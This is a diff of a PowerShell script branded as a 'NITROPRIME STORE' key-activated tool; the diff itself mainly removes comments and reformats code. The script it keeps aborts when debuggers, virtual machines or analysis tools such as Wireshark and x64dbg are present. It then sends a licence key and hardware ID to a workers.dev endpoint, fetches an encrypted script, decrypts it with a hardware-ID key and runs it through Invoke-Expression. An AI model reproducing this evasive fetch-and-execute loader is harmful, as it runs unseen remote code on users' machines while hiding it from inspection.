@@ -7,10 +7,6 @@ Write-Host "     [ NITROPRIME STORE ]" -ForegroundColor DarkGray
 Write-Host "     Internet Latest v.2"
 Write-Host ""
 
-# ==============================================================================
-# SECURITY CHECKS (ANTI-DEBUG & VM & TOOLS)
-# ==============================================================================
-
 if ([System.Diagnostics.Debugger]::IsAttached) {
     Write-Host "`n     [X] Security Violation: Debugger detected!" -ForegroundColor Red
     Start-Sleep -Seconds 3
@@ -22,7 +18,6 @@ function Test-VirtualEnvironment {
         $bios = Get-CimInstance -ClassName Win32_BIOS -ErrorAction SilentlyContinue
         $comp = Get-CimInstance -ClassName Win32_ComputerSystem -ErrorAction SilentlyContinue
         $vmKeywords = @("VMware", "VirtualBox", "QEMU", "KVM", "Hyper-V", "Xen", "Parallels", "Virtual")
-        
         foreach ($kw in $vmKeywords) {
             if ($bios.Manufacturer -match $kw -or $comp.Model -match $kw -or $bios.SMBIOSBIOSVersion -match $kw) {
                 return $true
@@ -43,7 +38,6 @@ if (Test-VirtualEnvironment) {
 function Test-ForbiddenProcesses {
     $badProcs = @("x64dbg", "x32dbg", "ida64", "ida", "wireshark", "procmon", "procexp", "dnSpy", "ollydbg")
     $runningProcs = Get-Process -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name
-    
     foreach ($p in $badProcs) {
         if ($runningProcs -contains $p) {
             return $true
@@ -58,10 +52,6 @@ if (Test-ForbiddenProcesses) {
     exit
 }
 
-# ==============================================================================
-# INPUT & CONFIGURATION
-# ==============================================================================
-
 $inputKey = Read-Host "     Key"
 
 if ([string]::IsNullOrWhiteSpace($inputKey)) {
@@ -71,10 +61,7 @@ if ([string]::IsNullOrWhiteSpace($inputKey)) {
 }
 
 $inputKey = $inputKey.Trim()
-
-$customHeaders = @{
-    "Content-Type" = "application/json"
-}
+$customHeaders = @{ "Content-Type" = "application/json" }
 
 function Get-HWID {
     try {
@@ -92,14 +79,10 @@ function Get-HWID {
 $workerUrl = "https://latestv2.shinchan12513.workers.dev/"
 $userHwid = Get-HWID
 
-$body = @{ 
-    key  = $inputKey
-    hwid = $userHwid 
-} | ConvertTo-Json
+$body = @{ key = $inputKey; hwid = $userHwid } | ConvertTo-Json
 
 try {
     $response = Invoke-RestMethod -Uri $workerUrl -Method Post -Body $body -Headers $customHeaders
-    
     if ($response.success) {
         Write-Host "`n     [+] Successfully" -ForegroundColor Green
         Start-Sleep -Seconds 2
@@ -114,9 +97,6 @@ try {
     exit
 }
 
-# ==============================================================================
-# MAIN MENU
-# ==============================================================================
 while ($true) {
     if ([System.Diagnostics.Debugger]::IsAttached -or (Test-ForbiddenProcesses)) {
         Write-Host "`n     [X] Security Breach Detected!" -ForegroundColor Red
@@ -135,14 +115,8 @@ while ($true) {
     
     if ($choice -eq 'f' -or $choice -eq 'F') {
         Clear-Host
-        
         try {
-            $tokenBody = @{
-                action = "get_token"
-                key    = $inputKey
-                hwid   = $userHwid
-            } | ConvertTo-Json
-
+            $tokenBody = @{ action = "get_token"; key = $inputKey; hwid = $userHwid } | ConvertTo-Json
             $tokenResponse = Invoke-RestMethod -Uri $workerUrl -Method Post -Body $tokenBody -Headers $customHeaders
 
             if (-not $tokenResponse.success) {
@@ -152,36 +126,24 @@ while ($true) {
             }
 
             $sessionToken = $tokenResponse.token
-
-            $scriptBody = @{
-                action = "get_script"
-                token  = $sessionToken
-                hwid   = $userHwid
-                key    = $inputKey
-            } | ConvertTo-Json
-            
+            $scriptBody = @{ action = "get_script"; token = $sessionToken; hwid = $userHwid; key = $inputKey } | ConvertTo-Json
             $scriptResponse = Invoke-RestMethod -Uri $workerUrl -Method Post -Body $scriptBody -Headers $customHeaders
             
             if ($scriptResponse.success) {
                 if ($scriptResponse.encrypted) {
-                    # เปลี่ยนมาใช้ AES-CBC ที่รองรับทุกเวอร์ชัน Windows
                     function Decrypt-Payload($encDataHex, $ivHex, $hwid) {
                         $aes = [System.Security.Cryptography.Aes]::Create()
                         $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
                         $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
-                        
                         $aes.Key = [System.Text.Encoding]::UTF8.GetBytes($hwid.PadRight(32, '0').Substring(0, 32))
                         $aes.IV = [byte[]]($ivHex -split '(.{2})' | Where-Object { $_ } | ForEach-Object { [Convert]::ToByte($_, 16) })
-                        
                         $cipherBytes = [byte[]]($encDataHex -split '(.{2})' | Where-Object { $_ } | ForEach-Object { [Convert]::ToByte($_, 16) })
-                        
                         $decryptor = $aes.CreateDecryptor()
                         $plainBytes = $decryptor.TransformFinalBlock($cipherBytes, 0, $cipherBytes.Length)
                         return [System.Text.Encoding]::UTF8.GetString($plainBytes)
                     }
 
                     $decryptedScript = Decrypt-Payload $scriptResponse.data $scriptResponse.iv $userHwid
-                    
                     Invoke-Expression $decryptedScript
                 } else {
                     Invoke-Expression $scriptResponse.script
@@ -204,7 +166,6 @@ while ($true) {
                 Write-Host "     [X] Message: $($_.Exception.Message)" -ForegroundColor Yellow
             }
         }
-        
         Read-Host '     Press Enter to return'
     }
 }
